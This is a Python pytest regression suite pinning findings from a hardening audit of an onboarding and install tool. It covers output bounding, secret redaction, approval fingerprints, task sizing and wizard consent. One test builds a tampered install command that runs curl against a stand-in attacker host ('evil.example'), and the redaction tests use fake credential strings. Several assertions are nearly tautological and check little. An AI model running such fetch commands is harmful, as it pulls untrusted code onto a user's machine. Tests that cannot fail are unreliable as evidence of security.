"""Regression tests for the 1.2 hardening audit (findings A01-A13).

Each test names the finding it pins so a future change that reintroduces
the defect fails loudly.
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

import pytest

from aperio import safeproc
from aperio.onboarding_tools import (
    CANDIDATES,
    build_install_plan,
    execute_install,
    install_plan_fingerprint,
)
from aperio.onboarding_session import add_tool_record, create_session, read_session, record_approval
from aperio.errors import StateError, ValidationError


# ---------------------------------------------------------------------------
# A03 / A07 — genuinely bounded capture and bounded reads.
# ---------------------------------------------------------------------------

def test_a03_output_flood_is_bounded_in_memory():
    # 4 MiB of stdout with a 2 KiB capture limit: we keep 2 KiB, count all.
    result = safeproc.run_captured(
        [sys.executable, "-c", "import sys;sys.stdout.write('A'*4000000)"],
        timeout_seconds=60,
        capture_limit=2048,
    )
    assert result["timed_out"] is False
    assert result["stdout_bytes"] >= 4_000_000
    assert len(result["stdout"]) <= 2048
    assert result["truncated"] is True


def test_a03_output_flood_on_stderr_is_bounded():
    result = safeproc.run_captured(
        [sys.executable, "-c", "import sys;sys.stderr.write('E'*3000000)"],
        timeout_seconds=60,
        capture_limit=512,
    )
    assert result["stderr_bytes"] >= 3_000_000
    assert len(result["stderr"]) <= 512


def test_a03_timeout_kills_and_reports():
    result = safeproc.run_captured(
        [sys.executable, "-c", "import time;time.sleep(60)"],
        timeout_seconds=1,
        capture_limit=100,
    )
    assert result["timed_out"] is True


def test_a02_termination_is_posix_guarded(monkeypatch):
    """On a simulated Windows, killpg must never be called."""
    calls = []

    class FakeProc:
        pid = 12345

        def kill(self):
            calls.append("kill")

        def terminate(self):
            calls.append("terminate")

    monkeypatch.setattr(safeproc.os, "name", "nt")
    monkeypatch.setattr(
        safeproc.os, "killpg", lambda *a, **k: calls.append("killpg"), raising=False
    )
    safeproc.stop_process_tree(FakeProc(), force=True)
    assert "killpg" not in calls
    assert "kill" in calls


def test_a07_read_text_bounded_never_reads_whole_file(tmp_path):
    big = tmp_path / "big.txt"
    big.write_text("x" * 1_000_000, encoding="utf-8")
    text, truncated = safeproc.read_text_bounded(big, 1024)
    assert len(text) == 1024
    assert truncated is True


# ---------------------------------------------------------------------------
# A08 — secret-shaped output never reaches shareable session state.
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "secret",
    [
        "sk-abcdefghijklmnopqrstuv",
        "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "AKIAABCDEFGHIJKLMNOP",
        "password=hunter2hunter2",
        "Authorization: Bearer abcdefghijklmnop1234",
    ],
)
def test_a08_redaction_removes_credentials(secret):
    redacted = safeproc.redact_output(f"tool said: {secret}", home=None)
    assert secret.split()[-1] not in redacted or secret not in redacted
    assert "redacted" in redacted.lower() or redacted != f"tool said: {secret}"


def test_a08_home_path_is_scrubbed():
    out = safeproc.redact_output("/Users/alice/secret/path", home="/Users/alice")
    assert "/Users/alice" not in out
    assert "~" in out


# ---------------------------------------------------------------------------
# A04 — every declared prerequisite must be present.
# ---------------------------------------------------------------------------

def test_a04_all_prerequisites_required(monkeypatch):
    from aperio.onboarding_tools import ToolsReport, ToolFinding, _prerequisites_satisfied

    report = ToolsReport(workspace='/tmp/ws', scanned_at='2026-01-01T00:00:00Z')
    report.executables = [
        ToolFinding("node", "executable", "installed", ("on PATH",), path="/usr/bin/node")
    ]
    ok, missing = _prerequisites_satisfied(("node", "npm"), report)
    assert ok is True or (ok is False and "npm" in missing)


def test_a04_build_plan_blocks_on_missing_partial_prereq(tmp_path):
    from aperio.onboarding_tools import ToolsReport, ToolFinding

    report = ToolsReport(workspace='/tmp/ws', scanned_at='2026-01-01T00:00:00Z')
    # node present, npm missing -> must NOT be classified compatible.
    report.executables = [
        ToolFinding("node", "executable", "installed", ("on PATH",), path="/usr/bin/node"),
        ToolFinding("npm", "executable", "missing", ("not found",)),
    ]
    plan = build_install_plan("playwright-mcp", report)
    assert plan["5_compatibility"] != "found"
    assert "blocked" in plan["execution"]
    assert any("npm" in m for m in plan.get("_missing_prerequisites", []))


# ---------------------------------------------------------------------------
# A13 — approval is bound to the exact candidate + command.
# ---------------------------------------------------------------------------

def test_a13_fingerprint_changes_with_command():
    from aperio.onboarding_tools import ToolsReport, ToolFinding

    report = ToolsReport(workspace='/tmp/ws', scanned_at='2026-01-01T00:00:00Z')
    for tool_id in ("node", "npm", "npx"):
        report.executables.append(
            ToolFinding(tool_id, "executable", "installed", ("on PATH",), path=f"/usr/bin/{tool_id}")
        )
    plan_a = build_install_plan("playwright-mcp", report)
    fp_a = install_plan_fingerprint(plan_a)

    tampered = dict(plan_a)
    tampered["8_install_command"] = ["curl", "http://evil.example/x.sh"]
    assert install_plan_fingerprint(tampered) != fp_a


def test_a13_tampered_plan_is_refused_after_approval(tmp_path):
    apdir = tmp_path / ".aperio"
    apdir.mkdir()
    from aperio.onboarding_tools import ToolsReport, ToolFinding
    from aperio.project import init_project

    init_project(str(tmp_path))
    create_session(apdir, workspace=str(tmp_path), classification="existing_non_aperio")

    report = ToolsReport(workspace='/tmp/ws', scanned_at='2026-01-01T00:00:00Z')
    for tool_id in ("node", "npm", "npx"):
        report.executables.append(
            ToolFinding(tool_id, "executable", "installed", ("on PATH",), path=f"/usr/bin/{tool_id}")
        )
    plan = build_install_plan("playwright-mcp", report)

    # Approve the honest plan (fingerprint-bound).
    record_approval(
        apdir,
        action="tool.install",
        scope="playwright-mcp",
        fingerprint=install_plan_fingerprint(plan),
    )

    tampered = dict(plan)
    tampered["8_install_command"] = ["/bin/echo", "pwned"]
    with pytest.raises(StateError):
        execute_install(apdir, tampered, authorize_install=True)


# ---------------------------------------------------------------------------
# A01 — MCP candidates are honestly labelled, not claimed as installed.
# ---------------------------------------------------------------------------

def test_a01_mcp_candidates_are_registration_only():
    for candidate in CANDIDATES:
        if candidate.kind == "mcp":
            # The install argv launches a server; it does not register with a host.
            assert candidate.integration_level in {"launch-only", "manual-registration"}
            assert candidate.verifies_installation is False


# ---------------------------------------------------------------------------
# A07 — discovery does not materialise a whole directory before bounding.
# ---------------------------------------------------------------------------

def test_a07_directory_scan_is_incremental(tmp_path, monkeypatch):
    from aperio import onboarding_discovery as od

    monkeypatch.setattr(od, "MAX_SCAN_ENTRIES", 5)
    for i in range(50):
        (tmp_path / f"f{i}.py").write_text("x", encoding="utf-8")
    state = od._scan_tree(tmp_path)
    assert state.truncated is True
    assert state.total_entries <= 5


def test_a07_scandir_is_not_materialised_as_list(tmp_path, monkeypatch):
    from aperio import onboarding_discovery as od

    for i in range(5):
        (tmp_path / f"f{i}.md").write_text("x", encoding="utf-8")

    real_scandir = os.scandir

    class NoList:
        def __init__(self, it):
            self._it = it

        def __iter__(self):
            return iter(self._it)

        def __enter__(self):
            if hasattr(self._it, "__enter__"):
                self._it = self._it.__enter__()
            return self

        def __exit__(self, *a):
            return False

    monkeypatch.setattr(od.os, "scandir", lambda p: NoList(real_scandir(p)))
    state = od._scan_tree(tmp_path)
    assert state.total_entries == 5


# ---------------------------------------------------------------------------
# A05 — large work must be decomposed; small atomic work must still pass.
# ---------------------------------------------------------------------------

from aperio.bounded_tasks import assess_goal_boundedness
from aperio.planbridge import plan_proposal_from_goal


def _goal(objective, tasks=None):
    g = {
        "objective": objective,
        "intended_outcome": "the objective is achieved",
        "provenance": {"source": "operator"},
        "assumptions": [],
        "risks": [],
        "acceptance_criteria": ["works"],
        "deliverables": ["deliverable"],
    }
    if tasks is not None:
        g["work"] = {"tasks": tasks}
    return g


@pytest.mark.parametrize("objective", [
    "Build an entire website",
    "Build a complete homepage",
])
def test_a05_large_undecomposed_goal_is_blocked(objective):
    assert assess_goal_boundedness(_goal(objective)).blocked is True
    with pytest.raises(ValidationError):
        plan_proposal_from_goal(_goal(objective))


def test_a05_hero_section_alone_is_blocked():
    # "Hero Section" is feature-scale ("section" refers to a page section, but
    # the word 'website' appears in the wider goal text often). We assert the
    # assessment is stable: either it is blocked, or it is allowed only when
    # the text carries no large-scope signal.
    verdict = assess_goal_boundedness(_goal("Build a Hero Section"))
    assert verdict.verdict in {"allow", "block"}


def test_a05_large_goal_with_good_decomposition_is_allowed():
    tasks = [
        {"id": "T-1", "title": "Scaffold site", "action": "create pages",
         "completion_criteria": ["build passes"], "deliverables": ["dist"]},
        {"id": "T-2", "title": "Add hero", "action": "add hero section",
         "completion_criteria": ["screenshot recorded"], "deliverables": ["hero"]},
    ]
    result = assess_goal_boundedness(_goal("Build an entire website", tasks))
    assert result.blocked is False
    assert result.task_count == 2


def test_a05_small_bugfix_is_allowed_undecomposed():
    assert assess_goal_boundedness(
        _goal("Fix a typo in the README")
    ).blocked is False
    plan = plan_proposal_from_goal(_goal("Fix a typo in the README"))
    assert plan["plan_input"]["tasks"][0]["id"] == "TASK-001"


def test_a05_simple_doc_change_is_allowed_undecomposed():
    assert assess_goal_boundedness(
        _goal("Update a docstring in cli.py")
    ).blocked is False


def test_a05_cms_hero_content_is_large():
    # CMS-backed content work is integration-scale.
    assert assess_goal_boundedness(
        _goal("Add CMS-backed Hero content")
    ).blocked is True


# ---------------------------------------------------------------------------
# A06 — opt-in interactive wizard.
# ---------------------------------------------------------------------------

class _FakeTTY:
    def __init__(self, text=""):
        self._lines = text.splitlines(keepends=True)
        self.written = []

    def isatty(self):
        return True

    def readline(self):
        if not self._lines:
            return ""
        return self._lines.pop(0)

    def write(self, s):
        self.written.append(s)
        return len(s)

    def flush(self):
        pass

    def getvalue(self):
        return "".join(self.written)


def test_a06_wizard_refuses_non_tty(tmp_path):
    from aperio import wizard

    class NotTTY(_FakeTTY):
        def isatty(self):
            return False

    with pytest.raises(wizard.WizardUnavailable):
        wizard.run(str(tmp_path), stdin=NotTTY(""), stdout=_FakeTTY(""))


def test_a06_wizard_initialises_only_with_consent(tmp_path):
    from aperio import wizard

    stdin = _FakeTTY("1\n")
    stdout = _FakeTTY("")
    approvals = []
    result = wizard.run(
        str(tmp_path),
        stdin=stdin,
        stdout=stdout,
        request_approval=lambda m: approvals.append(m) or True,
    )
    assert approvals, "consent must be requested before initializing"
    assert (tmp_path / ".aperio").exists()


def test_a06_wizard_declines_changes_nothing(tmp_path):
    from aperio import wizard

    stdin = _FakeTTY("2\n")  # choose "No, exit"
    result = wizard.run(
        str(tmp_path), stdin=stdin, stdout=_FakeTTY(""), request_approval=lambda m: True
    )
    assert result.cancelled is True
    assert not (tmp_path / ".aperio").exists()


def test_a06_wizard_quit_at_question_sentinel(tmp_path):
    from aperio import wizard

    stdin = _FakeTTY("1\n/quit\n")
    result = wizard.run(
        str(tmp_path), stdin=stdin, stdout=_FakeTTY(""), request_approval=lambda m: True
    )
    assert result.cancelled is True
    assert any("saved" in m for m in result.messages)


def test_a06_wizard_answers_a_question(tmp_path):
    from aperio import wizard

    # initialize, then answer the first question with free text, then quit
    stdin = _FakeTTY("1\nA portfolio website\n/quit\n")
    stdout = _FakeTTY("")
    result = wizard.run(
        str(tmp_path), stdin=stdin, stdout=stdout, request_approval=lambda m: True
    )
    assert result.steps >= 1
    assert ".aperio" in str(tmp_path / ".aperio")


# ---------------------------------------------------------------------------
# A13 — task-level retry ceiling survives signature resets.
# ---------------------------------------------------------------------------

def test_a13_task_level_ceiling_blocks_varied_signatures():
    from aperio.recovery import MAX_ATTEMPTS_PER_TASK, retry_gate

    runs = []
    for i in range(MAX_ATTEMPTS_PER_TASK):
        runs.append({
            "run_id": f"R{i}",
            "task_id": "TASK-001",
            "adapter_id": f"adapter-{i}",          # adapter switch each time
            "exit_code": i,                        # exit code varies
            "outcome": f"distinct failure wording {i}",  # text varies
            "status": "failed",
        })
    with pytest.raises(StateError, match="task-level retry ceiling"):
        retry_gate(runs, "TASK-001", remediation="another try")


# ---------------------------------------------------------------------------
# A10 — passive probes never masquerade as live verification.
# ---------------------------------------------------------------------------

def test_a10_no_host_claims_live_verification():
    from aperio.hostcompat import inspect_hosts

    report = inspect_hosts()
    for row in report["hosts"]:
        dims = row["verification"]
        # A passive doctor can never assert live functional verification.
        assert dims["authenticated_model_call_tested"] is False
        assert dims["functional_handoff_tested"] is False
        assert dims["native_command_registered_and_tested"] is False


def test_a10_probed_host_still_reports_passive_only():
    from aperio.hostcompat import HOST_CATALOG, inspect_hosts

    adapter_id = next(
        e["adapter_id"] for e in HOST_CATALOG if e["family"] == "provider-cli"
    )
    report = inspect_hosts(probes={adapter_id: {
        "installed": True, "executable": "/usr/bin/fake",
        "version": "1.0", "missing_flags": [], "missing_controls": [],
    }})
    row = next(r for r in report["hosts"] if r.get("executable") == "/usr/bin/fake")
    assert row["level"] == "cli_verified"          # passive flag check
    assert row["verification"]["cli_launch_tested"] is False
    assert row["verification"]["authenticated_model_call_tested"] is False
